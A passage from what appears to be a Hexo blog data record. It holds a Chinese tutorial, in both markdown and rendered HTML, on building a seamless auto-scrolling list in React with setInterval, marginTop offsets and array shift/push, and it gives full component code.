把当前 数据 第一项，加入 矩阵尾部\n      scrollData = 0; // 并把 高度 重置\n    }\n    // if (scrollData > -113) {\n    //   let firstItem = dutyList[0];\n    //   // dutyList.shift();\n    //   // dutyList.push(firstItem);\n    //   this.setState({\n    //     scrollData: scrollData--\n    //   })\n    // } else {\n    //   scrollData = 0;\n    //   let firstItem = dutyList[0];\n    //   dutyList.shift();\n    //   dutyList.push(firstItem);\n    // }\n  }, 50)\n}\n\n```\n\n**操作重点**\n+ 数组操作: 1️⃣`shift()`, 2️⃣`push(dutyList[0])`\n+ react: `setState`\n\n### 第四步 `鼠标移入移出/ 组件卸载` 清除定时器\n```ts\nremoveAnimationInterval() {\n  this.state.animationInterval && clearInterval(this.state.animationInterval);\n}\n\ncomponenWillUnmount() {\n  this.removeAnimationInterval();\n}\n```\n\n## 附录 完整代码\n**CarouselList.js**\n```ts\nexport default class CarouselList extends Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            data: this.props.data,\n            scrollData: 0\n        };\n    }\n\n    componentDidMount = () => {\n        this.addHandleTimer();\n    };\n\n    componentWillUnmount = () => {\n        this.removeHandleTimer();\n    }\n    //timers\n    addHandleTimer = () => {\n        let { data, scrollData } = this.state;\n        if (!data || !data.length) return null;\n        this.timer = setInterval(() => {\n            if (scrollData > -27) {\n                scrollData--;\n                this.setState({\n                    scrollData: scrollData\n                })\n            } else {\n                scrollData = 0;\n                let firstData = data[0];\n                data.shift();\n                data.push(firstData);\n            }\n        }, 70);\n    }\n\n    removeHandleTimer = () => {\n        this.timer && clearInterval(this.timer);\n    }\n\n    handleScroll = e => {\n        const ev = e || window.event;\n        e.preventDefault();\n        const conDom = this.refs[\"content\"];\n        const speed = 5; // scroll speed\n        if (ev.deltaY > 0) {\n            conDom.scrollTop += speed;\n        } else {\n            conDom.scrollTop -= speed;\n        }\n    };\n\n    render() {\n        const { data, scrollData } = this.state;\n        return (\n            <div\n                ref=\"content\"\n                onMouseEnter={this.removeHandleTimer}\n                onMouseLeave={this.addHandleTimer}\n                onWheel={this.handleScroll}\n            >\n                <ul style={{ marginTop: scrollData + \"px\" }}>\n                    {\n                        data.length > 0 && data.map((item, index) => {\n                            return (\n                                this.props.type === 'simple' ?\n                                    <li key={index}><p title={item.value}>{item.value}</p></li>\n                                    : <li key={index}><span>{item.id}</span><p title={item.intelligence}>{item.intelligence}</p></li>\n                            )\n                            // 默认：complex\n                            {/*<li key={index}><span>{item.id}</span><p title={item.intelligence}>{item.intelligence}</p></li>*/ }\n                        }\n                        )\n                    }\n                </ul>\n            </div>\n        );\n    }\n}\n\n```\n\n**CarouselList2.js**\n```ts\nexport default class CarouselList2 extends Component {\n    constructor(props) {\n        super(props);\n        console.log('是大法官',this.props.data)\n        this.state = {\n            data: this.props.data,\n            scrollData: 0\n        };\n    }\n\n    componentDidMount = () => {\n        this.addHandleTimer();\n    };\n\n    componentWillUnmount = () => {\n        this.removeHandleTimer();\n    };\n    //timers\n    addHandleTimer = () => {\n\n        let {data, scrollData} = this.state;\n        if (!data || !data.length) return null;\n        if(data.length < 5 ) return false;\n        this.timer = setInterval(() => {\n            if (scrollData > -52) {\n                scrollData--;\n                this.setState({\n                    scrollData: scrollData\n                })\n            } else {\n                scrollData = 0;\n                let firstData = data[0];\n                data.shift();\n                data.push(firstData);\n\n                let firstData1 = data[0];\n                data.shift();\n                data.push(firstData1);\n            }\n        }, 70);\n    }\n\n    removeHandleTimer = () => {\n        this.timer && clearInterval(this.timer);\n    }\n\n    handleScroll = e => {\n        const ev = e || window.event;\n        e.preventDefault();\n        const conDom = this.refs[\"content\"];\n        const speed = 6; // scroll speed\n        if (ev.deltaY > 0) {\n            conDom.scrollTop += speed;\n        } else {\n            conDom.scrollTop -= speed;\n        }\n    };\n\n    render() {\n        const {data, scrollData} = this.state;\n        return (\n            <div\n                ref=\"content\"\n                onMouseEnter={this.removeHandleTimer}\n                onMouseLeave={this.addHandleTimer}\n                onWheel={this.handleScroll}\n            >\n                <ul style={{marginTop: scrollData + \"px\"}}>\n                    {\n                        data.length > 0 && data.map((item, index) => {\n                                return (\n                                    this.props.type === 'superior' ?\n                                        <li key={item.id}>\n                                            <p title={item.name}>{item.name}</p>\n                                            <p title={item.card}>{item.card}</p>\n                                            <p title={item.show}>{item.show}</p>\n                                            <p title={item.feedback}>{item.feedback}</p>\n                                            <p title={item.state}>{item.state}</p>\n                                        </li>\n                                        : <li key={item.id}>\n                                            <p title={item.name}>{item.name}</p>\n                                            <p title={item.card}>{item.card}</p>\n                                            <p title={item.time}>{item.time}</p>\n                                            <p title={item.origin}>{item.origin}</p>\n                                            <p title={item.destination}>{item.destination}</p>\n                                        </li>\n                                )\n                            }\n                        )\n                    }\n                </ul>\n            </div>\n        );\n    }\n}\n```\n\n**InformationOnDuty.js**\n```ts\nimport \"./InformationOnDuty.scss\"\nimport { hidden } from \"ansi-colors\";\n\nclass InformationOnDuty extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      dutyList: [],\n      scrollData: 0,\n      inital: true\n    };\n    this.getOnDutyListData = this.getOnDutyListData.bind(this);\n    this.animationInterval = this.animationInterval.bind(this);\n    this.removeAnimationInterval = this.removeAnimationInterval.bind(this);\n    this.getOnDutyListData();\n  }\n\n  getOnDutyListData() {\n    axios({\n      method: 'GET',\n      url: `/OnDutyList`,\n    }).then(res => {\n      this.setState({\n        dutyList: res.data.result\n      }, () => this.animationInterval())\n    })\n  }\n\n  animationInterval() {\n    let { scrollData, dutyList } = this.state;\n    if (!dutyList.length) return;\n    this.state.animationInterval = setInterval(() => {\n      this.setState({\n        scrollData: scrollData--\n      });\n      \n      let firstItem = dutyList[1];\n\n      if (scrollData < 0 && scrollData > -2) {\n        if (this.state.inital) {\n          dutyList.push(dutyList[0]);\n          this.setState({\n            inital: false\n          })\n        }\n      }\n\n      // dutyList.push(firstItem);\n      if (scrollData % 128 === 0) {\n        // debugger\n\n        dutyList.shift();\n\n        dutyList.push(firstItem);\n        scrollData = 0;\n        // debugger\n      }\n      // if (scrollData > -113) {\n      //   let firstItem = dutyList[0];\n      //   // dutyList.shift();\n      //   // dutyList.push(firstItem);\n      //   this.setState({\n      //     scrollData: scrollData--\n      //   })\n      // } else {\n      //   scrollData = 0;\n      //   let firstItem = dutyList[0];\n      //   dutyList.shift();\n      //   dutyList.push(firstItem);\n      // }\n    }, 60)\n\n  }\n\n  removeAnimationInterval() {\n    this.state.animationInterval && clearInterval(this.state.animationInterval);\n  }\n\n  componentDidMount() {\n  }\n\n  componentWillReceiveProps() {\n    debugger\n\n  }\n\n  componenWillUnmount() {\n    this.removeAnimationInterval();\n  }\n\n  render() {\n    let { dutyList, scrollData } = this.state;\n    return (\n      <div className=\"InformationOnDuty\">\n        <div className=\"title\">\n          <div className=\"tit1\"><span>值班信息</span></div>\n          <div className=\"tit2\"><span>查看值班表</span></div>\n        </div>\n        <div\n          className=\"contetn\"\n          ref=\"content\"\n          onMouseEnter={this.removeAnimationInterval}\n          onMouseLeave={this.animationInterval}\n          style={{overflow: \"hidden\"}}\n        // onWheel={}\n        >\n          <div style={{ marginTop: scrollData + \"px\" }}>\n            {\n              dutyList.map((item, index) => {\n                return (\n                  <div className=\"card\" key={`${item.title}:${item.name}${index}`}>\n                    <div className=\"row1\">\n                      <span>{item.title}&nbsp;</span><b>&nbsp;|&nbsp;</b><span>{item.name}</span>\n                    </div>\n                    <div className=\"row2\">\n                      <span className={item.title.length > 3 ? 'nbsp4' : 'nbsp3'}>电话&nbsp;</span><b>&nbsp;|&nbsp;</b><span>{item.phone}</span>\n                    </div>\n                  </div>\n                )\n              })\n            }\n          </div>\n\n        </div>\n      </div>\n    )\n  }\n}\n\nexport default InformationOnDuty;\n```","source":"_posts/FrontEnd/JS特效实现/react-无缝滚动动画.md","raw":"---\ntitle: react-无缝滚动动画\ndate: 2018-12-18 09:22:18\ntags: \ncategories: Effects\n---\n## 无缝滚动\n\n### 第一步 定义 Dom结构\n\n+ 第一层`div`最外侧 负责 1️⃣鼠标 交互，2️⃣超出隐藏\n+ 第二层`div`负责整体动画，通过`marginTop`属性实现动画效果\n```html\n<div\n  className=\"contetn\"\n  ref=\"content\" // react中 通过 this.refs.content 获取 Dom元素\n  onMouseEnter={this.removeAnimationInterval} // 鼠标移入 清除定时器\n  onMouseLeave={this.animationInterval} // 鼠标移出 设置定时器\n  style={{overflow: \"hidden\"}} // 超出隐藏 多余内容\n  // onWheel={} // 鼠标滚轴 事件\n>\n  <div style={{ marginTop: scrollData + \"px\" }}> // 通过`marginTop`属性实现动画效果\n    {\n      dutyList.map((item, index) => {\n        return (\n          <div className=\"card\" key={`${item.title}:${item.name}${index}`}>\n            内部元素 非 动画效果 关键，可自定义内容\n          </div>\n        )\n      })\n    }\n  </div>\n</div>\n```\n\n### 第二步 获取数据 利用周期执行动画\n在请求数据的回调函数 中 设置state, 利用回调 执行 动画方法\n```ts\n  getOnDutyListData() {\n    axios({\n      method: 'GET',\n      url: `/OnDutyList`,\n    }).then(res => {\n      this.setState({\n        dutyList: res.data.result\n      }, () => this.animationInterval()) // 在这里，利用 回调 执行 动画方法。可以避免 在其他 周期里面获取不到 异步数据的情况\n    })\n  }\n```\n\n### 第三步 动画实现效果\n```ts\nanimationInterval() {\n  /** 获取滚动系数, 数据矩阵 */\n  let { scrollData, dutyList } = this.state;\n  /** 非空判断 */\n  if (!dutyList.length) return;\n\n  /** 设置定时器，挂载到 当前类下的 state */\n  this.state.animationInterval = setInterval(() => {\n    /** setState触发render，实现实时动画效果 */\n    this.setState({\n      scrollData: scrollData--\n    });\n\n    /** 初始化判断 */\n    if (this.state.inital && scrollData === -1) {\n      dutyList.push(dutyList[0]); // 第一次多加载 一个 数据第一项，实现首尾无缝滚动 \n      this.setState({\n        inital: false // 关闭 初始化\n      })\n    }\n\n    /** 判断 滚动位置 128为当前效果 中 itemCard 高度, 一但card全部高度 超出视图 执行内部语句 */\n    if (scrollData % 128 === 0) {\n      dutyList.shift(); // 删除第一项\n      dutyList.push(dutyList[0]); // 把当前 数据 第一项，加入 矩阵尾部\n      scrollData = 0; // 并把 高度 重置\n    }\n    // if (scrollData > -113) {\n    //   let firstItem = dutyList[0];\n    //   // dutyList.shift();\n    //   // dutyList.push(firstItem);\n    //   this.setState({\n    //     scrollData: scrollData--\n    //   })\n    // } else {\n    //   scrollData = 0;\n    //   let firstItem = dutyList[0];\n    //   dutyList.shift();\n    //   dutyList.push(firstItem);\n    // }\n  }, 50)\n}\n\n```\n\n**操作重点**\n+ 数组操作: 1️⃣`shift()`, 2️⃣`push(dutyList[0])`\n+ react: `setState`\n\n### 第四步 `鼠标移入移出/ 组件卸载` 清除定时器\n```ts\nremoveAnimationInterval() {\n  this.state.animationInterval && clearInterval(this.state.animationInterval);\n}\n\ncomponenWillUnmount() {\n  this.removeAnimationInterval();\n}\n```\n\n## 附录 完整代码\n**CarouselList.js**\n```ts\nexport default class CarouselList extends Component {\n    constructor(props) {\n        super(props);\n        this.state = {\n            data: this.props.data,\n            scrollData: 0\n        };\n    }\n\n    componentDidMount = () => {\n        this.addHandleTimer();\n    };\n\n    componentWillUnmount = () => {\n        this.removeHandleTimer();\n    }\n    //timers\n    addHandleTimer = () => {\n        let { data, scrollData } = this.state;\n        if (!data || !data.length) return null;\n        this.timer = setInterval(() => {\n            if (scrollData > -27) {\n                scrollData--;\n                this.setState({\n                    scrollData: scrollData\n                })\n            } else {\n                scrollData = 0;\n                let firstData = data[0];\n                data.shift();\n                data.push(firstData);\n            }\n        }, 70);\n    }\n\n    removeHandleTimer = () => {\n        this.timer && clearInterval(this.timer);\n    }\n\n    handleScroll = e => {\n        const ev = e || window.event;\n        e.preventDefault();\n        const conDom = this.refs[\"content\"];\n        const speed = 5; // scroll speed\n        if (ev.deltaY > 0) {\n            conDom.scrollTop += speed;\n        } else {\n            conDom.scrollTop -= speed;\n        }\n    };\n\n    render() {\n        const { data, scrollData } = this.state;\n        return (\n            <div\n                ref=\"content\"\n                onMouseEnter={this.removeHandleTimer}\n                onMouseLeave={this.addHandleTimer}\n                onWheel={this.handleScroll}\n            >\n                <ul style={{ marginTop: scrollData + \"px\" }}>\n                    {\n                        data.length > 0 && data.map((item, index) => {\n                            return (\n                                this.props.type === 'simple' ?\n                                    <li key={index}><p title={item.value}>{item.value}</p></li>\n                                    : <li key={index}><span>{item.id}</span><p title={item.intelligence}>{item.intelligence}</p></li>\n                            )\n                            // 默认：complex\n                            {/*<li key={index}><span>{item.id}</span><p title={item.intelligence}>{item.intelligence}</p></li>*/ }\n                        }\n                        )\n                    }\n                </ul>\n            </div>\n        );\n    }\n}\n\n```\n\n**CarouselList2.js**\n```ts\nexport default class CarouselList2 extends Component {\n    constructor(props) {\n        super(props);\n        console.log('是大法官',this.props.data)\n        this.state = {\n            data: this.props.data,\n            scrollData: 0\n        };\n    }\n\n    componentDidMount = () => {\n        this.addHandleTimer();\n    };\n\n    componentWillUnmount = () => {\n        this.removeHandleTimer();\n    };\n    //timers\n    addHandleTimer = () => {\n\n        let {data, scrollData} = this.state;\n        if (!data || !data.length) return null;\n        if(data.length < 5 ) return false;\n        this.timer = setInterval(() => {\n            if (scrollData > -52) {\n                scrollData--;\n                this.setState({\n                    scrollData: scrollData\n                })\n            } else {\n                scrollData = 0;\n                let firstData = data[0];\n                data.shift();\n                data.push(firstData);\n\n                let firstData1 = data[0];\n                data.shift();\n                data.push(firstData1);\n            }\n        }, 70);\n    }\n\n    removeHandleTimer = () => {\n        this.timer && clearInterval(this.timer);\n    }\n\n    handleScroll = e => {\n        const ev = e || window.event;\n        e.preventDefault();\n        const conDom = this.refs[\"content\"];\n        const speed = 6; // scroll speed\n        if (ev.deltaY > 0) {\n            conDom.scrollTop += speed;\n        } else {\n            conDom.scrollTop -= speed;\n        }\n    };\n\n    render() {\n        const {data, scrollData} = this.state;\n        return (\n            <div\n                ref=\"content\"\n                onMouseEnter={this.removeHandleTimer}\n                onMouseLeave={this.addHandleTimer}\n                onWheel={this.handleScroll}\n            >\n                <ul style={{marginTop: scrollData + \"px\"}}>\n                    {\n                        data.length > 0 && data.map((item, index) => {\n                                return (\n                                    this.props.type === 'superior' ?\n                                        <li key={item.id}>\n                                            <p title={item.name}>{item.name}</p>\n                                            <p title={item.card}>{item.card}</p>\n                                            <p title={item.show}>{item.show}</p>\n                                            <p title={item.feedback}>{item.feedback}</p>\n                                            <p title={item.state}>{item.state}</p>\n                                        </li>\n                                        : <li key={item.id}>\n                                            <p title={item.name}>{item.name}</p>\n                                            <p title={item.card}>{item.card}</p>\n                                            <p title={item.time}>{item.time}</p>\n                                            <p title={item.origin}>{item.origin}</p>\n                                            <p title={item.destination}>{item.destination}</p>\n                                        </li>\n                                )\n                            }\n                        )\n                    }\n                </ul>\n            </div>\n        );\n    }\n}\n```\n\n**InformationOnDuty.js**\n```ts\nimport \"./InformationOnDuty.scss\"\nimport { hidden } from \"ansi-colors\";\n\nclass InformationOnDuty extends Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      dutyList: [],\n      scrollData: 0,\n      inital: true\n    };\n    this.getOnDutyListData = this.getOnDutyListData.bind(this);\n    this.animationInterval = this.animationInterval.bind(this);\n    this.removeAnimationInterval = this.removeAnimationInterval.bind(this);\n    this.getOnDutyListData();\n  }\n\n  getOnDutyListData() {\n    axios({\n      method: 'GET',\n      url: `/OnDutyList`,\n    }).then(res => {\n      this.setState({\n        dutyList: res.data.result\n      }, () => this.animationInterval())\n    })\n  }\n\n  animationInterval() {\n    let { scrollData, dutyList } = this.state;\n    if (!dutyList.length) return;\n    this.state.animationInterval = setInterval(() => {\n      this.setState({\n        scrollData: scrollData--\n      });\n      \n      let firstItem = dutyList[1];\n\n      if (scrollData < 0 && scrollData > -2) {\n        if (this.state.inital) {\n          dutyList.push(dutyList[0]);\n          this.setState({\n            inital: false\n          })\n        }\n      }\n\n      // dutyList.push(firstItem);\n      if (scrollData % 128 === 0) {\n        // debugger\n\n        dutyList.shift();\n\n        dutyList.push(firstItem);\n        scrollData = 0;\n        // debugger\n      }\n      // if (scrollData > -113) {\n      //   let firstItem = dutyList[0];\n      //   // dutyList.shift();\n      //   // dutyList.push(firstItem);\n      //   this.setState({\n      //     scrollData: scrollData--\n      //   })\n      // } else {\n      //   scrollData = 0;\n      //   let firstItem = dutyList[0];\n      //   dutyList.shift();\n      //   dutyList.push(firstItem);\n      // }\n    }, 60)\n\n  }\n\n  removeAnimationInterval() {\n    this.state.animationInterval && clearInterval(this.state.animationInterval);\n  }\n\n  componentDidMount() {\n  }\n\n  componentWillReceiveProps() {\n    debugger\n\n  }\n\n  componenWillUnmount() {\n    this.removeAnimationInterval();\n  }\n\n  render() {\n    let { dutyList, scrollData } = this.state;\n    return (\n      <div className=\"InformationOnDuty\">\n        <div className=\"title\">\n          <div className=\"tit1\"><span>值班信息</span></div>\n          <div className=\"tit2\"><span>查看值班表</span></div>\n        </div>\n        <div\n          className=\"contetn\"\n          ref=\"content\"\n          onMouseEnter={this.removeAnimationInterval}\n          onMouseLeave={this.animationInterval}\n          style={{overflow: \"hidden\"}}\n        // onWheel={}\n        >\n          <div style={{ marginTop: scrollData + \"px\" }}>\n            {\n              dutyList.map((item, index) => {\n                return (\n                  <div className=\"card\" key={`${item.title}:${item.name}${index}`}>\n                    <div className=\"row1\">\n                      <span>{item.title}&nbsp;</span><b>&nbsp;|&nbsp;</b><span>{item.name}</span>\n                    </div>\n                    <div className=\"row2\">\n                      <span className={item.title.length > 3 ? 'nbsp4' : 'nbsp3'}>电话&nbsp;</span><b>&nbsp;|&nbsp;</b><span>{item.phone}</span>\n                    </div>\n                  </div>\n                )\n              })\n            }\n          </div>\n\n        </div>\n      </div>\n    )\n  }\n}\n\nexport default InformationOnDuty;\n```","slug":"FrontEnd/JS特效实现/react-无缝滚动动画","published":1,"updated":"2019-02-22T05:43:50.461Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry0900aqzodvsik17a2a","content":"<h2 id=\"无缝滚动\"><a href=\"#无缝滚动\" class=\"headerlink\" title=\"无缝滚动\"></a>无缝滚动</h2><h3 id=\"第一步-定义-Dom结构\"><a href=\"#第一步-定义-Dom结构\" class=\"headerlink\" title=\"第一步 定义 Dom结构\"></a>第一步 定义 Dom结构</h3><ul>\n<li>第一层<code>div</code>最外侧 负责 1️⃣鼠标 交互，2️⃣超出隐藏</li>\n<li>第二层<code>div</code>负责整体动画，通过<code>marginTop</code>属性实现动画效果<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">className</span>=<span class=\"string\">\"contetn\"</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">ref</span>=<span class=\"string\">\"content\"</span> // <span class=\"attr\">react</span>中 通过 <span class=\"attr\">this.refs.content</span> 获取 <span class=\"attr\">Dom</span>元素</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">onMouseEnter</span>=<span class=\"string\">&#123;this.removeAnimationInterval&#125;</span> // 鼠标移入 清除定时器</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">onMouseLeave</span>=<span class=\"string\">&#123;this.animationInterval&#125;</span> // 鼠标移出 设置定时器</span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">style</span>=<span class=\"string\">&#123;&#123;overflow:</span> \"<span class=\"attr\">hidden</span>\"&#125;&#125; // 超出隐藏 多余内容</span></span><br><span class=\"line\"><span class=\"tag\">  // <span class=\"attr\">onWheel</span>=<span class=\"string\">&#123;&#125;</span> // 鼠标滚轴 事件</span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">style</span>=<span class=\"string\">&#123;&#123;</span> <span class=\"attr\">marginTop:</span> <span class=\"attr\">scrollData</span> + \"<span class=\"attr\">px</span>\" &#125;&#125;&gt;</span> // 通过`marginTop`属性实现动画效果</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      dutyList.map((item, index) =&gt; &#123;</span><br><span class=\"line\">        return (</span><br><span class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">className</span>=<span class=\"string\">\"card\"</span> <span class=\"attr\">key</span>=<span class=\"string\">&#123;</span>`$&#123;<span class=\"attr\">item.title</span>&#125;<span class=\"attr\">:</span>$&#123;<span class=\"attr\">item.name</span>&#125;$&#123;<span class=\"attr\">index</span>&#125;`&#125;&gt;</span></span><br><span class=\"line\">            内部元素 非 动画效果 关键，可自定义内容</span><br><span class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"第二步-获取数据-利用周期执行动画\"><a href=\"#第二步-获取数据-利用周期执行动画\" class=\"headerlink\" title=\"第二步 获取数据 利用周期执行动画\"></a>第二步 获取数据 利用周期执行动画</h3><p>在请求数据的回调函数 中 设置state, 利用回调 执行 动画方法<br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getOnDutyListData() &#123;</span><br><span class=\"line\">  axios(&#123;</span><br><span class=\"line\">    method: <span class=\"string\">'GET'</span>,</span><br><span class=\"line\">    url: <span class=\"string\">`/OnDutyList`</span>,</span><br><span class=\"line\">  &#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      dutyList: res.data.result</span><br><span class=\"line\">    &#125;, <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.animationInterval()) <span class=\"comment\">// 在这里，利用 回调 执行 动画方法。可以避免 在其他 周期里面获取不到 异步数据的情况</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第三步-动画实现效果\"><a href=\"#第三步-动画实现效果\" class=\"headerlink\" title=\"第三步 动画实现效果\"></a>第三步 动画实现效果</h3><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">animationInterval() &#123;</span><br><span class=\"line\">  <span class=\"comment\">/** 获取滚动系数, 数据矩阵 */</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; scrollData, dutyList &#125; = <span class=\"keyword\">this</span>.state;</span><br><span class=\"line\">  <span class=\"comment\">/** 非空判断 */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!dutyList.length) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/** 设置定时器，挂载到 当前类下的 state */</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.state.animationInterval = setInterval(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/** setState触发render，实现实时动画效果 */</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">      scrollData: scrollData--</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 初始化判断 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.inital &amp;&amp; scrollData === <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      dutyList.push(dutyList[<span class=\"number\">0</span>]); <span class=\"comment\">// 第一次多加载 一个 数据第一项，实现首尾无缝滚动 </span></span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        inital: <span class=\"literal\">false</span> <span class=\"comment\">// 关闭 初始化</span></span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 判断 滚动位置 128为当前效果 中 itemCard 高度, 一但card全部高度 超出视图 执行内部语句 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (scrollData % <span class=\"number\">128</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      dutyList.shift(); <span class=\"comment\">// 删除第一项</span></span><br><span class=\"line\">      dutyList.push(dutyList[<span class=\"number\">0</span>]); <span class=\"comment\">// 把当前 数据 第一项，加入 矩阵尾部</span></span><br><span class=\"line\">      scrollData = <span class=\"number\">0</span>; <span class=\"comment\">// 并把 高度 重置</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// if (scrollData &gt; -113) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">    <span class=\"comment\">//   // dutyList.shift();</span></span><br><span class=\"line\">    <span class=\"comment\">//   // dutyList.push(firstItem);</span></span><br><span class=\"line\">    <span class=\"comment\">//   this.setState(&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     scrollData: scrollData--</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;)</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125; else &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//   scrollData = 0;</span></span><br><span class=\"line\">    <span class=\"comment\">//   let firstItem = dutyList[0];</span></span><br><span class=\"line\">    <span class=\"comment\">//   dutyList.shift();</span></span><br><span class=\"line\">    <span class=\"comment\">//   dutyList.push(firstItem);</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\">  &#125;, <span class=\"number\">50</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>操作重点</strong></p>\n<ul>\n<li>数组操作: 1️⃣<code>shift()</code>, 2️⃣<code>push(dutyList[0])</code></li>\n<li>react: <code>setState</code></li>\n</ul>\n<h3 id=\"第四步-鼠标移入移出-组件卸载-清除定时器\"><a href=\"#第四步-鼠标移入移出-组件卸载-清除定时器\" class=\"headerlink\" title=\"第四步 鼠标移入移出/ 组件卸载 清除定时器\"></a>第四步 <code>鼠标移入移出/ 组件卸载</code> 清除定时器</h3><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">removeAnimationInterval() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.state.animationInterval &amp;&amp; clearInterval(<span class=\"keyword\">this</span>.state.animationInterval);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">componenWillUnmount() &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.removeAnimationInterval();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"附录-完整代码\"><a href=\"#附录-完整代码\" class=\"headerlink\" title=\"附录 完整代码\"></a>附录 完整代码</h2><p><strong>CarouselList.js</strong><br><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 